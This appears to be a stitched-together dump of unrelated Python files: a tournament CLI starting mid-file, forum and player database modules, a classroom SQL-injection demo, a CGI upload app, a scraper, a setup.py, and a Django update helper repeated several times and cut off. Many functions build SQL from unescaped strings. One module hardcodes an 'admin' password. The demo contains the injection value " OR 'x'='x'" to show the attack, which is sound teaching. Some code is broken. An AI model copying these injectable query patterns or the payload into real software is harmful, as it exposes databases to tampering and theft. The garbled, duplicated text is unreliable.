    tx.hrules = False
    tx.vrules = False
    tx.left_padding_width = 0
    tx.right_padding_width = 0
    ta = tools.table_gen(['ID', 'Name', 'Country'], players_list1, "l")
    tb = tools.table_gen(['ID', 'Name', 'Country'], players_list2, "l")
    tx.add_row([ta, tb])
    print tx
    if bye:
        print "Bye: " + bye[1]
    # smoosh (technical term) the two lists together and make them fight
    # for their dinner!
    for a, b in zip(players_list1, players_list2):
        round_number += 1
        print "Round %i: " % round_number,
        reportMatch(p1=str(a[0]), p2=str(b[0]))
        player_pairs.append([a[0], a[1], b[0], b[1]])
    stop = time.time()
    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Complete. Operation took %s seconds." % dur[:5]
    print "Swiss matchups complete."
    connection.commit()
    cursor.close()
    connection.close()
    status = 0
    return player_pairs


def deleteMatch(match=""):
    """
    Delete an existing match. We expect the following:
    - Match ID
    """
    connection = connect()
    cursor = connection.cursor()
    if not match:
        raise ValueError("An ID # is required.")
    start = time.time()
    cursor.execute("DELETE FROM matches where id=%s", (match,))
    stop = time.time()

    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Complete. Operation took %s seconds." % dur[:5]
    connection.commit()
    cursor.close()
    connection.close()
    return 0


def deleteMatches():
    """
    Delete ALL matches from the database.
    """
    connection = connect()
    cursor = connection.cursor()
    start = time.time()
    cursor.execute("TRUNCATE matches;")
    stop = time.time()

    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Complete. Operation took %s seconds." % dur[:5]
    connection.commit()
    cursor.close()
    connection.close()
    return 0


def latest_match():
    """
    Get the latest match's information
    """
    connection = connect()
    cursor = connection.cursor()
    print "The Latest Match"
    name = ''
    count = 0
    returned_id = 0
    start = time.time()
    cursor.execute("SELECT * FROM matches ORDER BY id DESC LIMIT 1")
    results = cursor.fetchall()
    # Generate the table
    table = PrettyTable(['#', 'ID#', 'P1 ID', 'P2 ID', 'WINNER', 'TIME'])
    table.align = 'l'
    for row in results:
        count += 1
        # Generate the rows for the table
        cursor.execute("SELECT * FROM players "
                       "WHERE code=\'%s\'", (row[3],))
        player = cursor.fetchall()
        for entry in player:
            name = entry[1]
        if name == '':
            name = "[PLAYER DELETED]"
        table.add_row([count, row[0], row[1], row[2], name, row[4]])
        returned_id = row[0]
    print table
    stop = time.time()
    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Returned %s results in %s seconds" % (count, dur[:5])
    connection.commit()
    cursor.close()
    connection.close()
    return returned_id


def playerStandings():
    """
    Rank players by the number of wins. Get the list of wins and total
    matches for each player.
    """
    count = 0
    returned_blob = []
    connection = connect()
    cursor = connection.cursor()
    start = time.time()
    cursor.execute("SELECT * from players;")
    player_blob = cursor.fetchall()
    table = PrettyTable(["ID", "PLAYER", "WINS", "MATCHES"])
    table.align = "l"
    for player in player_blob:
        count += 1
        # Count the number of times the player has won (they are present in
        # player_1 column inside tournament.matches).
        cursor.execute("SELECT count(*) "
                       "FROM matches "
                       "WHERE player_1='%s'", (player[3],))
        wins_blob = cursor.fetchall()
        wins_num = wins_blob[0][0]
        # Count the number of times the player has lost (they are present in
        # player_2 column inside tournament.matches).
        cursor.execute("SELECT count(*) "
                       "FROM matches "
                       "WHERE player_2='%s'", (player[3],))
        losses_blob = cursor.fetchall()
        matches_num = losses_blob[0][0] + wins_num
        table.add_row([player[0], player[1], wins_num, matches_num])
        returned_blob.append([player[0], player[1], wins_num, matches_num])
    print table
    stop = time.time()
    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Returned %s results in %s seconds" % (count, dur[:5])
    return returned_blob


def countPlayers():
    """A function needed to fulfill the requirements of Udacity's
    tournament_test.py. This function gets used to count the number of
    players in the Players table."""
    connection = connect()
    cursor = connection.cursor()
    cursor.execute("SELECT COUNT(id) FROM players;")
    result = cursor.fetchall()
    connection.commit()
    cursor.close()
    connection.close()
    return result[0][0]


def argument_parser():
    """
    Using command-line arguments to control actions. User can use flags to run
    certain, pre-defined scenarios. This will also allow for reuse of code where
    applicable.
    """
    parser = arg.ArgumentParser(description=cfg.APP_DESCRIPTION)

    # NEW PLAYER function
    parser.add_argument('--new-player', '-n',
                        dest='registerPlayer',
                        action='store',
                        nargs='+',
                        metavar='FIRST LAST COUNTRY',
                        help='Create a new player.')

    # NEW MATCH function
    parser.add_argument('--new-match', '-m',
                        dest='new_match',
                        action='store',
                        nargs="+",
                        metavar='ID#1 ID#2',
                        help='Create a new match. Provide two player IDs.')

    # SWISS MATCHUP function
    parser.add_argument('--swiss-match', '-s',
                        dest='swissPairings',
                        action='store_true',
                        default=False,
                        help='Create a new match with swiss pairing.')

    # GET LATEST RESULTS function
    parser.add_argument('--latest-match', '-l',
                        dest='latest_match',
                        action='store_true',
                        default=False,
                        help='Get the results from the latest match.')

    # DELETE PLAYER function
    parser.add_argument('--delete-player', '-d',
                        dest='deletePlayer',
                        action='store',
                        metavar='ID',
                        help='Remove a player from the match system.')

    # EDIT PLAYER function
    parser.add_argument('--edit-player', '-e',
                        dest='editPlayer',
                        action='store',
                        nargs='+',
                        metavar='ID NEWNAME NEWCOUNTRY',
                        help='Edit a player\'s exiting information.')

    # DELETE MATCH function
    parser.add_argument('--delete-match', '-f',
                        dest='deleteMatch',
                        action='store',
                        metavar='ID',
                        help='Remove a match from the match system.')

    # LIST PLAYERS function
    parser.add_argument('--list-players', '-p',
                        dest='list_players',
                        action='store_true',
                        default=False,
                        help='List all players.')

    # LIST RANKED function
    parser.add_argument('--list-ranking', '-t',
                        dest='list_ranking',
                        action='store_true',
                        default=False,
                        help='List rankings.')

    return parser


# ROUTING LOGIC #
def main():
    parser = argument_parser()
    args = parser.parse_args()
    if args.registerPlayer:
        registerPlayer(player_name=(args.registerPlayer[0] + ' ' + args.registerPlayer[1]),
                   country=args.registerPlayer[2])

    if args.new_match:
        players = args.new_match
        reportMatch(p1=players[0], p2=players[1])

    if args.swiss_match:
        swissPairings()

    if args.deletePlayer:
        deletePlayer(player=str(args.delete_player))

    if args.editPlayer:
        name = "%s %s" % (args.editPlayer[1], args.editPlayer[2])
        editPlayer(player=str(args.editPlayer[0]),
                    new_name=name, new_country=args.editPlayer[3])

    if args.list_players:
        list_players()

    if args.deleteMatch:
        deleteMatch(match=str(args.deleteMatch))

    if args.latest_match:
        latest_match()

    if args.list_ranking:
        playerStandings()

    # IF NO ARGUMENTS #

    # Print all options.

    if len(sys.argv) == 1:
        parser.print_help()


if __name__ == "__main__":
    check_version(sys.version_info)
    main()

#
# Database access functions for the web forum.
#

import time                    
import psycopg2                    

## Get posts from database.
def GetAllPosts():                    
    conn = psycopg2.connect("dbname=forum")                    
    cur = conn.cursor()                    
    # Grabs all of our posts from our the DB
    cur.execute("SELECT time, content FROM posts ORDER BY time desc")                    
    # Processes our fecthall into a dicitonary
    posts = ({'content': str(row[1]), 'time': str(row[0])}                    
    for row in cur.fetchall())                    
    conn.close()                    
    return posts                    

## Add a post to the database.
def AddPost(content):                    
    conn = psycopg2.connect("dbname=forum")                    
    cur = conn.cursor()                    
    cur.execute("INSERT INTO posts (content) VALUES ('%s')" % content)                    
    conn.commit()                    
    conn.close()                    

#===========================================================================
# database.py
# 
# Notes:
#	- Code interacts with MySQL database.
#	- Returns objects in JSON format for sending to client.
#
#===========================================================================

#
# Dependencies
#==============
import MySQLdb                    

#
# Constants
#============
HOST_NAME = "localhost"
USER_NAME = "COMP4350_admin"
USER_PASS = "admin"
TABL_NAME = "COMP4350_GRP5"

#***************************************************************************
#***************************************************************************

def print_players():
	db = MySQLdb.connect(HOST_NAME, USER_NAME, USER_PASS, TABL_NAME)                    
	c = db.cursor()
	c.execute("SELECT * FROM Player")
	print "\nPython-MySQL Result Object\n============================="                    
	result = cursor.fetchone()                    
	while (result != None):
		print "- ", result, "\n"
		result = c.fetchone()
	print "----\n"
	db.close()

def get_player(username):
	db = MySQLdb.connect(HOST_NAME, USER_NAME, USER_PASS, TABL_NAME)                    
	c = db.cursor()
	c.execute("SELECT * FROM Player WHERE Username = \"" + username + "\"")                    
	result = c.fetchone()
	db.close()
	return result
	
print "\nOutput:\n"                    
print (get_player("steve"))                    
print "\n"                    

#! /usr/bin/env python
#
# An SQL demo.  This builds a simple customer database
# However, it will work with either sqlite3 or mysql
# The hierarchy of objects is
# business CONTAINS databases
# databases CONTAINS tables
# tables CONTAINS records
# records CONTAINS fields

import datetime
import sys
import string

def print_users_by_state(state):
    cursor.execute("""SELECT first_name, last_name, city, state FROM customer where state="%s";"""%state)
    for row in cursor.fetchall():
        print row[0],row[1],row[2],row[3]

def get_credentials(db) :
    """This function opens the credentials file, which is under the control of the system
administrator.  The software engineer cannot see it"""
    credentials_file = 'credentials_file.txt'
    try :
        f = open(credentials_file,'r')
    except IOError, e:
        print """Problems opening the credentials file %s - check file protection
and EUID this database is running under"""
        sys.exit(1)
    credentials = f.readlines()
    lineno = 0
    for c in credentials :
        lineno += 1
        fields = c.split(":")
        if len(fields) != 4 :
            raise ValueError("Line %d of file %s has the wrong number of fields,\
should be 4 actually is %d" % (lineno, credentials_file, len(fields) ))
        if fields[0] == db :
            fields[3] = string.strip( fields[3] )
            f.close()
            return fields[1:4]
    else :
        raise ValueError("The credentials file %s does not contain a host/user/password tuple\
for database %s") % ( credentials, db)
    f.close()
    return

def populate_database() :
    """This subroutine populates the database.  Note that cursor and connection are passed globally"""
    today = datetime.date.today()

    customers=[\
        ("Jeff","Silverman","924 20th AVE E","","Seattle","WA","98112", today, "1"),
        ("Robin","Finch","The Aviary","1100 Nowhere st","Utopia","KS","75024", today, "2"),
        ("Felix","Felis","1103 SW 23rd st","","Chicago","IL","68123", today, "3"),
        ("Jay","Inslee","Governors Mansion","Capitol Grounds", "Olympia", "WA", "98501", today, "4" ),
        ]

    try :
        for customer in customers:
            cursor.execute('''INSERT INTO customer (
        first_name, last_name, address_1, address_2, city, state, zipcode, signup_date, customer_number)
        VALUES ( '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', %s )''' % customer )
    finally :  
        connection.commit()

   
def update_database( new_city, new_state, zipcode, customer_number ) :
    """This subroutine updates the database.  Note that cursor and connection are passed globally"""
    

    try :
        cursor.execute('''UPDATE customer SET city="%s", zipcode="%s", state="IL"
                WHERE customer_number=%s ''' % ( new_city, zipcode, customer_number ) )
    except sql.ProgrammingError,e :
        print "The update failed"
        raise
    else :
        print "The update succeeded"



def update_database_better ( new_city, new_state, zipcode, customer_number ) :
    """This subroutine updates the database.  Note that cursor and connection are passed globally
This version is better because it sanitizes the input customer_number"""
    

    try :
        customer_number = int ( customer_number ) # Guarantees that the customer number will be an integer
        cursor.execute('''UPDATE customer SET city="%s", zipcode="%s", state="IL"
                WHERE customer_number=%s ''' % ( new_city, zipcode, customer_number ) )
    except ValueError, e :
        print "Converting the customer number to an integer caused a ValueError exception.  %s" % \
        customer_number
        raise
    except sql.ProgrammingError,e :
        print "The update failed"
        raise
    else :
        print "The update succeeded"


argv1 = str.lower(sys.argv[1])
if argv1 == "sqlite3" :
    import sqlite3 as sql
    connection = sql.connect('business.db')
elif argv1 == "mysql" :
    import MySQLdb as sql
    DB = 'business'
    (host, user, password ) = get_credentials(DB)
    connection = sql.connect(host=host, user=user, passwd=password, db=DB)
else :
    print "Usage is \npython %s sqlite3\nor\npython %s mysql\n" % ( sys.argv[0],
                                                                    sys.argv[0] )
    sys.exit(1)
    
cursor = connection.cursor()

# Since we are starting from scratch, delete the table if it already exists.
cursor.execute("""DROP TABLE IF EXISTS customer""")

cursor.execute("""CREATE TABLE customer  (
first_name VARCHAR(15) NOT NULL,
last_name VARCHAR(15) NOT NULL,
address_1 VARCHAR(30) NOT NULL,
address_2 VARCHAR(30),
city VARCHAR(20) NOT NULL,
state CHAR(2) NOT NULL,
zipcode CHAR(5) NOT NULL,
signup_date DATE,
customer_number INT ) """)

populate_database()

print_users_by_state("WA")

new_city="Cairo"
new_state="IL"
zipcode="62914"
customer_number = "3"

update_database(new_city, new_state, zipcode, customer_number)

print_users_by_state("IL")

if len(sys.argv) == 3 and sys.argv[2]=="evil" :
    """Let's do an SQL injection attack"""
    new_city="Aurora"
    new_state="IL"
    zipcode="60503"
    customer_number = "3"
    evil = " OR 'x'='x'"
    try :
        update_database ( new_city, new_state, zipcode, customer_number + evil )
    except sql.ProgrammingError,e :
        print "The SQL injection attack failed"                    
    else :
        print "The SQL injection attack succeeded"                    

    print_users_by_state("IL")
    new_city="Miami"
    new_state="FL"
    zipcode="33101"
    customer_number = "3"
    try :
        update_database_better ( new_city, new_state, zipcode, customer_number + evil )
    except sql.ProgrammingError,e :
        print "The SQL injection attack failed"                    
    except ValueError,e :
        print "The SQL injection attack was prevented"                    
    else :
        print "The SQL injection attack succeeded"                    

    print_users_by_state("FL")
                       
connection.close()


#!/usr/bin/env python

import cgi
import sqlite3
import os
import hashlib
import uuid


def generate_hash(password):
    salt = uuid.uuid4().hex
    hash_val = hashlib.sha256(salt.encode() + password.encode()).hexdigest()
    return hash_val, salt


def check_password(hash_salt, password_input):
    return hash_salt[0] == hashlib.sha256(hash_salt[1].encode()+password_input.encode()).hexdigest()


def get_active_user():
    conn = sqlite3.connect('server.db')
    c = conn.cursor()
    cmd = "SELECT username FROM users WHERE active = ?"
    c.execute(cmd, (1, ))
    username = c.fetchone()[0]
    conn.close()
    return username


def auth_user(f):
    username = f.getvalue('username')
    password = f.getvalue('password')

    conn = sqlite3.connect('server.db')
    c = conn.cursor()
    c.execute("SELECT hash, salt FROM users WHERE username = ?", (username,))                    
    hash_salt = c.fetchone()

    if hash_salt is None:
        print """ Sign up for a new account:
        <a href="http://localhost:8000/index.py">Go back/a>"""
    elif check_password(hash_salt, password):
        print """ password authentication successful!"""
        c.execute("UPDATE users SET active = ? WHERE username = ?", (1, username))                    
        conn.commit()
        conn.close()
        display_user_page()
    else:
        print """ wrong password! Try again:
        <a href="http://localhost:8000/index.py">Log in</a>"""


def display_user_page():
    """ HTML boilerplate of forms, files listing, status of operation """
    username = get_active_user()
    print """
    <h1>%s</h1>
    ----------------------------------------------------------------------""" % username
    files_path = './files/'+username
    file_list = os.listdir(files_path)

    print """ <h2><a href="http://localhost:8000/index.py?log_out=1">Log out</a></h2>
    -----------------------------------------------------------------------"""
    print """ <h2> Change password </h2>
        <form method="post" action="login.py">
                new password:<input type="text" name="new_password"><br/>
                confirm new password:<input type="text" name="confirm_new_password"><br/>
                <input type="submit" value="Submit">
        </form>
    -----------------------------------------------------------------------"""
    print """
    <h2> Upload File </h2>
    <form enctype="multipart/form-data" action="login.py" method="post">
        <p>File: <input type="file" name="filename" /></p>
        <p><input type="submit" value="Upload" /></p>
    </form>
    ----------------------------------------------------------------------"""
    print """
    <h2> Delete File </h2>
    <form action="login.py" method="post" target="_blank">
    <select name="dropdown">"""
    #<option value="Maths" selected>Maths</option>
    for i in file_list:
        print "<option value=%s selected>%s</option>" % (i, i)
    print """
    </select>
    <input type="submit" value="Delete"/>
    </form>
    ----------------------------------------------------------------------"""
    print "<h2> file list </h2>"
    for i in file_list:
        print "<h4>%s</h4>" % (i, )
        print """
        <form method="get" action=%s>
        <button type="submit">Download!</button>
        </form>
        """ % ('./files/'+username+'/'+i, )


def check_file_ext(file_name):
    return file_name[-3:] == 'txt' or file_name[-3:] == 'log' or file_name[-3:] == 'pdf'


def upload_file(f):
    username = get_active_user()

    file_item = f['filename']
    # Test if the file was uploaded
    if file_item.filename:
        # strip leading path from file name to avoid
        # directory traversal attacks
        fn = os.path.basename(file_item.filename)
        if check_file_ext(fn):
            file_path = './files/'+username+'/' + fn
            open(file_path, 'wb').write(file_item.file.read())
            message = '<h3>The file "' + fn + '" was uploaded successfully</h3>'
        else:
            message = '<h3> Only files with extension txt/pdf/log will be accepted'
    else:
        message = '<h3>No file was uploaded</h3>'
    print message
    display_user_page()


def delete_file(f):
    username = get_active_user()
    if form.getvalue('dropdown'):
        file_name = form.getvalue('dropdown')
        file_path = './files/'+username+'/'+file_name
        os.remove(file_path)
        message = 'removed ', file_name
    else:
        message = "Not entered"

    print message
    display_user_page()


def change_password(f):
    username = get_active_user()
    new_password = f.getvalue('new_password')
    confirm_new_password = f.getvalue('confirm_new_password')
    if new_password == confirm_new_password and len(new_password) >= 6 and username != new_password:
        new_hash_salt = generate_hash(new_password)
        conn = sqlite3.connect('server.db')
        c = conn.cursor()
        c.execute("SELECT hash, salt FROM users WHERE username = ?", (username, ))                    
        old_hash_salt = c.fetchone()
        if old_hash_salt == new_hash_salt:
            message = 'old and new passwords are the same! try again'
        else:
            c.execute("UPDATE users SET hash = ?, salt = ? WHERE username = ?", (new_hash_salt[0], new_hash_salt[1], username))                    
            conn.commit()
            message = 'password change successful!'
        conn.close()
    else:
        message = "passwords don't match! or" \
                  "length should be atleast 6 characters or" \
                  "password is same as username" \
                  " try again!"
    print message
    display_user_page()


# main
form = cgi.FieldStorage()
print """Content-type: text/html\r\n\r\n"""

if 'username' in form and 'password' in form:
    auth_user(form)
elif 'filename' in form:
    upload_file(form)
elif 'dropdown' in form:
    delete_file(form)
elif 'new_password' in form and 'confirm_new_password' in form:
    change_password(form)


#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sqlite3
from os import path
import sys

import requests
from bs4 import BeautifulSoup

connect = sqlite3.connect(path.join(sys.path[0], 'comics.db'))
cursor = connect.cursor()

def check(current_num):
    try:
        cursor.execute('SELECT * FROM comics WHERE num="%s"' % current_num)                    
    except sqlite3.OperationalError:
        cursor.execute('CREATE TABLE comics (num text)')
        return False
    else:
        return False if cursor.fetchone() is None else True

naruto_comics = 'http://www.tvimm.com/NARUTO.html#1'
r = requests.get(naruto_comics)
soup = BeautifulSoup(r.text)
num = soup.find('a', target='_blank')['href'].split('/')[-1]
if check(num):
    print 'NARUTO: not updated yet.'
else:
    print 'NARUTO: has been updated to', num
    cursor.execute('INSERT INTO comics VALUES ("%s")' % num)                    
    connect.commit()





"""Setup file for cheshire3 package."""
from __future__ import with_statement

import sys
import os
import inspect

from warnings import warn

# Import Distribute / Setuptools
import distribute_setup
distribute_setup.use_setuptools()
from setuptools import setup, find_packages
from pkg_resources import DistributionNotFound

# Check Python version
py_version = getattr(sys, 'version_info', (0, 0, 0))

if py_version < (2, 6):
    warn("Cheshire3 requires Python 2.6 or later; some code may be "
         "incompatible with earlier versions.")

# Inspect to find current path
setuppath = inspect.getfile(inspect.currentframe())
setupdir = os.path.dirname(setuppath)

# Basic information
_name = 'cheshire3'
_description = ('Cheshire3 Search and Retrieval Engine and Information '
                'Framework')
# Discover version number from file    
with open(os.path.join(setupdir, 'VERSION.txt'), 'r') as vfh:
    _version = vfh.read().strip()

_download_url = ('http://download.cheshire3.org/{0}/src/{1}-{2}.tar.gz'
                 ''.format(_version[:3], _name, _version))

# More detailed description from README
try:
    fh = open(os.path.join(setupdir, 'README.rst'), 'r')
except IOError:
    _long_description = ''
else:
    _long_description = fh.read()
    fh.close()

# Requirements
with open(os.path.join(setupdir, 'requirements.txt'), 'r') as fh:
    _install_requires = fh.readlines()
_tests_require = []
# Determine python-dateutil version
if py_version < (3, 0):
    dateutilstr = 'python-dateutil == 1.5'
    if py_version < (2, 7):
        _install_requires.append('argparse')
        _tests_require.append('unittest2')
else:
    dateutilstr = 'python-dateutil >= 2.0'

_install_requires.append(dateutilstr)


setup(
    name=_name,
    version=_version,
    packages=[_name],
    include_package_data=True,
    package_data={'cheshire3': ['configs/*.xml', 'configs/extra/*.xml']},
    exclude_package_data={'': ['README.*', '.gitignore']},
    requires=['lxml(>=2.1)', 'bsddb', 'dateutil', 'argparse'],
    tests_require=_tests_require,
    install_requires=_install_requires,
    setup_requires=['setuptools-git'],
    dependency_links=[
        "http://labix.org/python-dateutil",
        "http://www.panix.com/~asl2/software/PyZ3950/",
        "http://download.cheshire3.org/latest/reqs/"
    ],
    extras_require={
        'graph': ['rdflib'],
        'datamining': ['svm'],
        'lucene': ['lucene'],
        'sql': ['PyGreSQL >= 3.8.1'],                    
        'textmining': ['numpy', 'nltk >= 2.0'],
        'web': ['pyoai', 'PyZ3950 >= 2.04', 'ZSI < 2.0']
    },
    test_suite="cheshire3.test.testAll.suite",
    scripts=['scripts/DocumentConverter.py'],
    entry_points={
        'console_scripts': [
            'cheshire3 = cheshire3.commands.console:main',
            'cheshire3-init = cheshire3.commands.init:main',
            'cheshire3-load = cheshire3.commands.load:main',
            'cheshire3-register = cheshire3.commands.register:main',
            'cheshire3-search = cheshire3.commands.search:main',
            'cheshire3-serve = cheshire3.commands.serve:main'
        ],
    },
    keywords="xml document search information retrieval engine data text",
    description=_description,
    long_description=_long_description,
    author="Rob Sanderson, et al.",
    author_email="azaroth@liv.ac.uk",
    maintainer='John Harrison',
    maintainer_email='john.harrison@liv.ac.uk',
    license="BSD",
    classifiers=[
        "Intended Audience :: Developers",
        "Intended Audience :: Information Technology",
        "License :: OSI Approved :: BSD License",
        "Programming Language :: Python :: 2.6",
        "Programming Language :: Python :: 2.7",
        "Topic :: Internet :: WWW/HTTP :: Indexing/Search",
        "Topic :: Internet :: WWW/HTTP :: WSGI :: Application",
        "Topic :: Internet :: Z39.50",
        "Topic :: Text Processing :: Indexing",
        "Topic :: Text Processing :: Linguistic",
        "Topic :: Text Processing :: Markup"
    ],
    url="http://www.cheshire3.org/",
    download_url=_download_url
)

# browsershots.org - Test your web design in different browsers
# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>
#
# Browsershots is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# Browsershots is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

"""
Update only selected fields of a model.

The problem with model.save() is that it also overwrites all other
fields with possibly stale data.
"""

__revision__ = "$Rev$"
__date__ = "$Date$"
__author__ = "$Author$"

from django.db import connection, models, transaction


def update_fields(self, **kwargs):
    """
    Update selected model fields in the database, but leave the other
    fields alone. Use this rather than model.save() for performance
    and data consistency.

    You can use this as a function or add it as a method to your models:
    import granular_update
    class Example(models.Model):
        name = models.CharField(max_length=20)
        number = models.IntegerField()
        update_fields = granular_update.update_fields
    """
    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']
    for field_name in kwargs:
        setattr(self, field_name, kwargs[field_name])
        field = self._meta.get_field(field_name)
        value = field.get_db_prep_save(kwargs[field_name])
        if isinstance(value, basestring):                    
            value = "'%s'" % value.encode('utf-8').replace('\\', r'\\')                    
        elif isinstance(value, models.Model):                    
            value = str(value.id)                    
        elif value is None:                    
            value = 'NULL'                    
        else:                    
            value = str(value)                    
        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))                    
    sql.pop(-1) # Remove the last comma
    sql.extend(['WHERE', 'id', '=', str(self.id)])                    
    sql = ' '.join(sql)
    connection.cursor().execute(sql)                    
    transaction.commit_unless_managed()


update_fields.alters_data = True

# browsershots.org - Test your web design in different browsers
# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>
#
# Browsershots is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# Browsershots is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

"""
Update only selected fields of a model.

The problem with model.save() is that it also overwrites all other
fields with possibly stale data.
"""

__revision__ = "$Rev$"
__date__ = "$Date$"
__author__ = "$Author$"

from django.db import connection, models, transaction


def update_fields(self, **kwargs):
    """
    Update selected model fields in the database, but leave the other
    fields alone. Use this rather than model.save() for performance
    and data consistency.

    You can use this as a function or add it as a method to your models:
    import granular_update
    class Example(models.Model):
        name = models.CharField(max_length=20)
        number = models.IntegerField()
        update_fields = granular_update.update_fields
    """
    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']
    for field_name in kwargs:
        setattr(self, field_name, kwargs[field_name])
        field = self._meta.get_field(field_name)
        value = field.get_db_prep_save(kwargs[field_name])
        if isinstance(value, basestring):                    
            value = "'%s'" % value.encode('utf-8').replace('\\', r'\\')                    
        elif isinstance(value, models.Model):                    
            value = str(value.id)                    
        elif value is None:                    
            value = 'NULL'                    
        else:                    
            value = str(value)                    
        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))                    
    sql.pop(-1) # Remove the last comma
    sql.extend(['WHERE', 'id', '=', str(self.id)])                    
    sql = ' '.join(sql)
    connection.cursor().execute(sql)                    
    transaction.commit_unless_managed()


update_fields.alters_data = True

# browsershots.org - Test your web design in different browsers
# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>
#
# Browsershots is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# Browsershots is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

"""
Update only selected fields of a model.

The problem with model.save() is that it also overwrites all other
fields with possibly stale data.
"""

__revision__ = "$Rev$"
__date__ = "$Date$"
__author__ = "$Author$"

from django.db import connection, models, transaction


def update_fields(self, **kwargs):
    """
    Update selected model fields in the database, but leave the other
    fields alone. Use this rather than model.save() for performance
    and data consistency.

    You can use this as a function or add it as a method to your models:
    import granular_update
    class Example(models.Model):
        name = models.CharField(max_length=20)
        number = models.IntegerField()
        update_fields = granular_update.update_fields
    """
    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']
    for field_name in kwargs:
        setattr(self, field_name, kwargs[field_name])
        field = self._meta.get_field(field_name)
        value = field.get_db_prep_save(kwargs[field_name])
        if isinstance(value, basestring):                    
            value = "'%s'" % value.encode('utf-8').replace('\\', r'\\')                    
        elif isinstance(value, models.Model):                    
            value = str(value.id)                    
        elif value is None:                    
            value = 'NULL'                    
        else:                    
            value = str(value)                    
        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))                    
    sql.pop(-1) # Remove the last comma
    sql.extend(['WHERE', 'id', '=', str(self.id)])                    
    sql = ' '.join(sql)
    connection.cursor().execute(sql)                    
    transaction.commit_unless_managed()


update_fields.alters_data = True

# browsershots.org - Test your web design in different browsers
# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>
#
# Browsershots is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# Browsershots is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

"""
Update only selected fields of a model.

The problem with model.save() is that it also overwrites all other
fields with possibly stale data.
"""

__revision__ = "$Rev$"
__date__ = "$Date$"
__author__ = "$Author$"

from django.db import connection, models, transaction


def update_fields(self, **kwargs):
    """
    Update selected model fields in the database, but leave the other
    fields alone. Use this rather than model.save() for performance
    and data consistency.

    You can use this as a function or add it as a method to your models:
    import granular_update
    class Example(models.Model):
        name = models.CharField(max_length=20)
        number = models.IntegerField()
        update_fields = granular_update.update_fields
    """
    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']
    for field_name in kwargs:
        setattr(self, field_name, kwargs[field_name])
        field = self._meta.get_field(field_name)
        value = field.get_db_prep_save(kwargs[field_name])
        if isinstance(value, basestring):                    
            value = "'%s'" % value.encode('utf-8').replace('\\', r'\\')                    
        elif isinstance(value, models.Model):                    
            value = str(value.id)                    
        elif value is None:                    
            value = 'NULL'                    
        else:                    
            value = str(value)                    
        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))                    
    sql.pop(-1) # Remove the last comma
    sql.extend(['WHERE', 'id', '=', str(self.id)])                    
    sql = ' '.join(sql)
    connection.cursor().execute(sql)                    
    transaction.commit_unless_managed()


update_fields.alters_data = True

# browsershots.org - Test your web design in different browsers
# Copyright (C) 2007 Johann C. Rocholl <johann@browsershots.org>
#
# Browsershots is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# Browsershots is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

"""
Update only selected fields of a model.

The problem with model.save() is that it also overwrites all other
fields with possibly stale data.
"""

__revision__ = "$Rev$"
__date__ = "$Date$"
__author__ = "$Author$"

from django.db import connection, models, transaction


def update_fields(self, **kwargs):
    """
    Update selected model fields in the database, but leave the other
    fields alone. Use this rather than model.save() for performance
    and data consistency.

    You can use this as a function or add it as a method to your models:
    import granular_update
    class Example(models.Model):
        name = models.CharField(max_length=20)
        number = models.IntegerField()
        update_fields = granular_update.update_fields
    """
    sql = ['UPDATE', connection.ops.quote_name(self._meta.db_table), 'SET']
